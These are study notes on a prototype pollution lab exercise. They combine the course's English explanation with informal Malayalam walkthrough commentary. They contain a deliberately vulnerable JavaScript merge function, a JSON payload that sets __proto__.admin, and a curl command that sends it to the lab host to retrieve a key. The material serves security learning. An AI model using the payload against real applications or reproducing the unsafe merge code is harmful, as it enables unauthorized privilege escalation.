## Introduction
-->This course details the exploitation of a vulnerability that can be found in some JavaScript applications. This issue allows an attacker to define arbitrary attributes that will be shared by every object in the application. The well-known example of this issue was found in [Lodash](https://lodash.com/) and is covered in details in the following article: [https://codeburst.io/what-is-prototype-pollution-49482fc4b638](https://codeburst.io/what-is-prototype-pollution-49482fc4b638)
-->This exercise is using Node as a CGI to limit the impact of any mistake (risk of Denial of Service). In a real world scenario, the exploitation of this issue will have a permanent effect and be shared amongst all users of the application.

## Prototype Pollution
-->The idea behind prototype pollution is to pollute the prototype of a base object. This allows you to define arbitrary attributes. You are injecting extra-attributes to the base Object that will be shared amongst all the other Objects thanks to the keyword `\_\_proto\_\_.`

If you want to test the behaviour of` \_\_proto\_\_`, you can use your browser Web Console:
```
	>> a={}
	Object {  }
	>> b={}
	Object {  }
	>> b.__proto__.foo='bar';
	"bar"
	>> b.foo
	"bar"
	>> c={}
	Object {  }
	>> c.foo
	"bar"
	>> a.foo
	"bar"
```
-->In the code above, by defining `\_\_proto\_\_.foo` for d, we pollute the prototype of every object created before or after the pollution happens. The idea of this attack is to do the same thing remotely and creating/setting an attribute that will change the application's behaviour.

## The merge function
-->The merge function in this exercise is a classic example of code that will create a prototype pollution as this code does copy attributes without checking and allows an attacker to add `\_\_proto\_\_ `attribute in the merged Object.

## Exploitation
-->To exploit this issue you will need to add an element `\_\_proto\_\_` in your request (in JSON) that will define the necessary attribute and allow you to get the key for this challenge.

## Conclusion
-->This exercise showed you how you can use prototype pollution to change the behaviour in an application and get access to code path that shouldn't be reachable.

# Video Explanation
-->ivide ith correct eenganeyan work aakunath enenikariyila.theory part il console il chyunath mukalil un nokiko
->ivide njan GET /  request eduth repeater il idunu enit GET mati POST aakunu. content-type:application/json kodikunu enit payload il :
```
{"user":"admin",
"__proto__":{"admin":true}}
```
een kodukunu.enit send adikumbol namuk key kitunund ok
-->lab ile page il ingnae aan kanikunath :
## Prototype Pollution

In this challenge you need to exploit the prototype pollution to gain access to the key. To limit the risk of denial of service, the code runs as a CGI. In a real scenario you may only have one chance at exploiting this issue and risk to crash the application by trying this attack.

Part of the source code can be found below:
```js
function merge(dst, src) {
    for (var attr in src) {
        if (typeof(dst[attr]) == "object" &&
            typeof(src[attr]) == "object") {
            merge(dst[attr], src[attr]);
        } else {
            dst[attr] = src[attr];
        }
    }
    return dst;
}


if (request.method == "POST") {
  if (request.headers.content_type == 'application/json') {
    user=merge({"user":""}, JSON.parse(request.post.data));
    admin={};
    response.headers.content_type = 'application/json' ;
    if (admin.admin == true) {
      write(JSON.stringify({"key": ""+process.env['PTLAB_KEY']}));
    } else {
      write(JSON.stringify(user));
    }
 }
```
-->ith noki ithinanusarich chyumbol namuk key kitum.ini ith curl il chyunath nokam
->`curl -X POST -H "Content-Type:application/json" http://ptl-441d7e99-99e72224.libcurl.so --data '{"user":"admin","__proto__":{"admin":true}}'`
-->ivide "user":"admin"  en thane kodukanam enila blank koduthalum aakum.ivide `__proto__`  ilan main aayi namal nokendath ok